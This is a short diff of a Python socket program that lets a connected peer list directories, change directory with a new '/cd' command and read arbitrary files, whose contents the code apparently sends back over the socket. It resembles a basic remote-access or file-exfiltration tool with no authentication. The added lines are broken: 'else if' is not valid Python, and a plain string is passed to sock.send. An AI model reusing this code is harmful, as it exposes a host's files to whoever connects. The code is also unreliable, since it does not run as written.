@@ -28,6 +28,9 @@ while data_received < data_expected:
     for c in listdir():
         if data.decode("utf-8") == 'x':
             sock.send(f'{c}  \n '.encode())
+        else if '/cd' in data.decode("utf-8"):
+            chdir(data.decode("utf-8")[3:len(data.decode("utf-8")) - 3])
+            sock.send('Feito!')
         else:
             t = open(data.decode("utf-8"), 'rb')
             msm = t.read()
